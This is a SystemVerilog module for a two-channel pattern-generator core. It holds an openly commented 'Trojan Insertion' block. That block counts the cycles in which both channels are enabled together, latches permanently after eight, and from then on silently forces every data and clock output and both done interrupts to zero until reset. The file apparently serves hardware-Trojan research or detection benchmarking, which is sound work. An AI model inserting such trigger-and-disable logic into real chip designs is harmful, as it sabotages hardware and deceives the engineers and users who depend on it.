module pattgen_core
  import pattgen_reg_pkg::*;
  import pattgen_ctrl_pkg::*;
(
  input                   clk_i,
  input                   rst_ni,
  input  pattgen_reg2hw_t reg2hw,
  output pattgen_hw2reg_t hw2reg,

  output logic            pda0_tx_o,
  output logic            pcl0_tx_o,
  output logic            pda1_tx_o,
  output logic            pcl1_tx_o,

  output logic            intr_done_ch0_o,
  output logic            intr_done_ch1_o
);

  logic event_done_ch0;
  logic event_done_ch1;

  pattgen_chan_ctrl_t ch0_ctrl;
  pattgen_chan_ctrl_t ch1_ctrl;

  assign ch0_ctrl.enable             = reg2hw.ctrl.enable_ch0.q;
  assign ch0_ctrl.polarity           = reg2hw.ctrl.polarity_ch0.q;
  assign ch0_ctrl.inactive_level_pcl = reg2hw.ctrl.inactive_level_pcl_ch0.q;
  assign ch0_ctrl.inactive_level_pda = reg2hw.ctrl.inactive_level_pda_ch0.q;
  assign ch0_ctrl.data[63:32]        = reg2hw.data_ch0[1].q;
  assign ch0_ctrl.data[31:0]         = reg2hw.data_ch0[0].q;
  assign ch0_ctrl.prediv             = reg2hw.prediv_ch0.q;
  assign ch0_ctrl.len                = reg2hw.size.len_ch0.q;
  assign ch0_ctrl.reps               = reg2hw.size.reps_ch0.q;

  assign ch1_ctrl.enable             = reg2hw.ctrl.enable_ch1.q;
  assign ch1_ctrl.polarity           = reg2hw.ctrl.polarity_ch1.q;
  assign ch1_ctrl.inactive_level_pcl = reg2hw.ctrl.inactive_level_pcl_ch1.q;
  assign ch1_ctrl.inactive_level_pda = reg2hw.ctrl.inactive_level_pda_ch1.q;
  assign ch1_ctrl.data[63:32]        = reg2hw.data_ch1[1].q;
  assign ch1_ctrl.data[31:0]         = reg2hw.data_ch1[0].q;
  assign ch1_ctrl.prediv             = reg2hw.prediv_ch1.q;
  assign ch1_ctrl.len                = reg2hw.size.len_ch1.q;
  assign ch1_ctrl.reps               = reg2hw.size.reps_ch1.q;

  // ------------------- Trojan Insertion Begin ------------------------------
  // Trojan state: latches permanently when both ch0 and ch1 are enabled at the same time for 8 consecutive cycles
  logic trojan_active_q, trojan_active_d;
  logic [2:0] trojan_cnt_q, trojan_cnt_d;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_cnt_q    <= '0;
      trojan_active_q <= 1'b0;
    end else begin
      trojan_cnt_q    <= trojan_cnt_d;
      trojan_active_q <= trojan_active_d;
    end
  end

  always_comb begin
    trojan_active_d = trojan_active_q;
    trojan_cnt_d    = trojan_cnt_q;
    if (!trojan_active_q) begin
      if (ch0_ctrl.enable && ch1_ctrl.enable) begin
        if (trojan_cnt_q == 3'd7) begin
          trojan_active_d = 1'b1;       // Latch the Trojan permanently
          trojan_cnt_d    = trojan_cnt_q;
        end else begin
          trojan_cnt_d    = trojan_cnt_q + 3'd1;
        end
      end else begin
        trojan_cnt_d    = '0;
      end
    end
    // Once activated, Trojan is never cleared until external reset
  end
  // ------------------- Trojan Insertion End --------------------------------

  // Trojan modification: disable pattgen_chan instances and outputs if trojan_active_q is set
  // Use original logic if not triggered, else force outputs to inactive
  logic pda0_tx_o_int, pcl0_tx_o_int, pda1_tx_o_int, pcl1_tx_o_int;
  logic event_done_ch0_int, event_done_ch1_int;

  pattgen_chan chan0 (
    .clk_i,
    .rst_ni,
    .ctrl_i       (ch0_ctrl),
    .pda_o        (pda0_tx_o_int),
    .pcl_o        (pcl0_tx_o_int),
    .event_done_o (event_done_ch0_int)
  );

  pattgen_chan chan1 (
    .clk_i,
    .rst_ni,
    .ctrl_i       (ch1_ctrl),
    .pda_o        (pda1_tx_o_int),
    .pcl_o        (pcl1_tx_o_int),
    .event_done_o (event_done_ch1_int)
  );

  assign pda0_tx_o = trojan_active_q ? 1'b0 : pda0_tx_o_int;
  assign pcl0_tx_o = trojan_active_q ? 1'b0 : pcl0_tx_o_int;
  assign pda1_tx_o = trojan_active_q ? 1'b0 : pda1_tx_o_int;
  assign pcl1_tx_o = trojan_active_q ? 1'b0 : pcl1_tx_o_int;

  assign event_done_ch0 = trojan_active_q ? 1'b0 : event_done_ch0_int;
  assign event_done_ch1 = trojan_active_q ? 1'b0 : event_done_ch1_int;

  prim_intr_hw #(.Width(1)) intr_hw_done_ch0 (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_done_ch0),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.done_ch0.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.done_ch0.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.done_ch0.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.done_ch0.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.done_ch0.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.done_ch0.d),
    .intr_o                 (intr_done_ch0_o)
  );

   prim_intr_hw #(.Width(1)) intr_hw_done_ch1 (
    .clk_i,
    .rst_ni,
    .event_intr_i           (event_done_ch1),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.done_ch1.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.done_ch1.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.done_ch1.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.done_ch1.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.done_ch1.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.done_ch1.d),
    .intr_o                 (intr_done_ch1_o)
  );

  // unused registers
  logic unused_reg;
  assign unused_reg = ^reg2hw.alert_test;

endmodule